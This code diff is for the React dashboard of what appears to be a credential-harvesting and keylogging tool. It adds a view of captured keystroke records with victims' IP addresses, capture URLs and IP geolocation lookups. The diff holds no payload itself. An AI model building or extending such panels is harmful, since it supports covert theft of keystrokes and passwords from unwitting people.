@@ -85,6 +85,9 @@ const styles = theme => ({
     width: '100%',
     position: 'absolute',
   },
+  tabsLoading: {
+    top: 136
+  },
   '@media (min-width: 700px)': {
     appBarShift: {
       width: `calc(100% - ${drawerWidth}px)`,
@@ -156,7 +159,8 @@ const styles = theme => ({
     },
   },
   tabsContent: {
-    marginTop: 134,
+    marginTop: 136,
+    height: 'calc(100% - 167px)',
   },
   '@media (max-width: 699px)': {
     content: {
@@ -337,14 +341,14 @@ class PersistentDrawer extends Component {
                 fullWidth
                 className={classes.tabs}
               >
-                <Tab label="Passwords" icon={<LockIcon />} />
-                <Tab label="Keylogger" icon={<KeyboardIcon />} />
-                <Tab label="Project config" icon={<SettingsIcon />} />
+                <Tab label="Passwords" icon={<LockIcon />} disabled={this.state.loading} />
+                <Tab label="Keylogger" icon={<KeyboardIcon />} disabled={this.state.loading} />
+                <Tab label="Project config" icon={<SettingsIcon />} disabled={this.state.loading} />
               </Tabs>
             ) : null
           }
           </AppBar>
-          {this.state.loading ? (<LinearProgress className={classes.loading} /> ) : null}
+          {this.state.loading ? (<LinearProgress className={`${classes.loading} ${this.state.currentProject ? classes.tabsLoading : ''}`} /> ) : null}
           <Drawer
             type={this.props.parentState.width >= 700 ? "persistent" : ''}
             classes={{
@@ -396,7 +400,7 @@ class PersistentDrawer extends Component {
                                 <Timestamp
                                   time={record.timestamp}
                                   format='ago'
-                                  precision={this.props.parentState.width > 600 ? 2 : 1}
+                                  precision={this.props.parentState.width > 700 ? 2 : 1}
                                   autoUpdate={5}
                                 />
                               </TableCell>
@@ -436,7 +440,6 @@ class PersistentDrawer extends Component {
                             </TableRow>
                           )
                         })}
-                        <tr ref={el => this.tableEnd = el} className="tableEnd"></tr>
                       </TableBody>
                     </Table>
                   </Paper>
@@ -460,7 +463,7 @@ class PersistentDrawer extends Component {
                             <CloseIcon />
                           </IconButton>
                           <Typography type="title" color="inherit" className={classes.flex}>
-                            Record for {this.state.currentProject.name}
+                            Password record for {this.state.currentProject.name}
                           </Typography>
                           {/* <Button color="contrast" onClick={this.handleRecordClose}>
                             save
@@ -528,7 +531,127 @@ class PersistentDrawer extends Component {
               }
               {this.state.tab === 1 && 
                 <span>
-                  Coming Soon
+                  <Paper className={classes.paper}>
+                    <Table>
+                      <TableHead>
+                        <TableRow>
+                          <TableCell className={classes.tableCell}>
+                            Time
+                          </TableCell>
+                          <TableCell className={classes.tableCell}>
+                            Keystrokes
+                          </TableCell>
+                          <TableCell className={classes.tableCell}>
+                            IP Address
+                          </TableCell>
+                          <TableCell className={`${classes.tableCell} ${classes.center}`} width={64}>
+                            Details
+                          </TableCell>
+                        </TableRow>
+                      </TableHead>
+                      <TableBody>
+                        {this.state.currentProject.keylogger.map((record, i) => {
+                          return (
+                            <TableRow key={i}>
+                              <TableCell className={classes.tableCell}>
+                                <Timestamp
+                                  time={record.timestamp}
+                                  format='ago'
+                                  precision={this.props.parentState.width > 700 ? 2 : 1}
+                                  autoUpdate={5}
+                                />
+                              </TableCell>
+                              <TableCell className={classes.tableCell}>
+                                {Math.round(record.keys.length / 2)}
+                              </TableCell>
+                              <TableCell className={classes.tableCell}>
+                                {record.ip.query}
+                              </TableCell>
+                              <TableCell className={classes.tableCell} numeric>
+                                <Tooltip
+                                  title={
+                                    <span>
+                                      {record.url.href && url.parse(record.url.href).hostname && record.url.title ? (
+                                        <span>
+                                          {url.parse(record.url.href).hostname} ({record.url.title})
+                                          <br/>
+                                        </span>
+                                      ) : null}
+                                      {record.ip.query && record.ip.country ? (
+                                        <span>
+                                          {record.ip.query} ({record.ip.country})
+                                          <br/>
+                                        </span>
+                                      ) : null}
+                                    </span>
+                                  }
+                                  placement="left"
+                                  disableTriggerFocus
+                                  disableTriggerTouch
+                                >
+                                  <Button color="primary" dense onClick={() => {this.handleRecordOpen(record)}}>
+                                    More
+                                  </Button>
+                                </Tooltip>
+                              </TableCell>
+                            </TableRow>
+                          )
+                        })}
+                      </TableBody>
+                    </Table>
+                  </Paper>
+                  <Tooltip title="Show the raw JSON database entries" placement="bottom">
+                    <Button onClick={this.viewJSON} color="primary">
+                      View JSON
+                    </Button>
+                  </Tooltip>
+                  {this.state.recordOpen ? (
+                    <Dialog
+                      fullScreen
+                      open={this.state.recordOpen}
+                      onRequestClose={this.handleRecordClose}
+                      transition={Transition}
+                    >
+                      <AppBar>
+                        <Toolbar>
+                          <IconButton color="contrast" onClick={this.handleRecordClose} aria-label="Close">
+                            <CloseIcon />
+                          </IconButton>
+                          <Typography type="title" color="inherit" className={classes.flex}>
+                            Keylogger record for {this.state.currentProject.name}
+                          </Typography>
+                          {/* <Button color="contrast" onClick={this.handleRecordClose}>
+                            save
+                          </Button> */}
+                        </Toolbar>
+                      </AppBar>
+                      <List className={classes.recordContent}>
+                        <CopyToClipboard text={this.state.record.timestamp}
+                          onCopy={() => this.props.notify({
+                            title: "Copied to clipboard!",
+                            message: this.state.record.timestamp
+                          })}>
+                          <ListItem button>
+                            <ListItemText primary="Timestamp" secondary={<Timestamp time={this.state.record.timestamp} format='full' />} />
+                          </ListItem>
+                        </CopyToClipboard>
+                        <Divider />
+                        <ListItem button onClick={() => {window.open(this.state.record.url.href).bind}}>
+                          <ListItemText primary="Capture URL" secondary={this.state.record.url.href} />
+                        </ListItem>
+                        <Divider />
+                        <ListItem button onClick={() => {window.open("https://tools.keycdn.com/geo?host=" + this.state.record.ip.query)}}>
+                          <ListItemText primary="IP Address" secondary={`${this.state.record.ip.query}${this.state.record.ip.country ? " (" + this.state.record.ip.city + " - " + this.state.record.ip.country + ")" : ""}`} />
+                        </ListItem>
+                        <Divider />
+                        <br />
+                        <ListItem>
+                          <ReactJson src={this.state.record} />
+                        </ListItem>
+                      </List>
+                    </Dialog>
+                    ) : null
+                  }
                 </span>
               }
               {this.state.tab === 2 && 
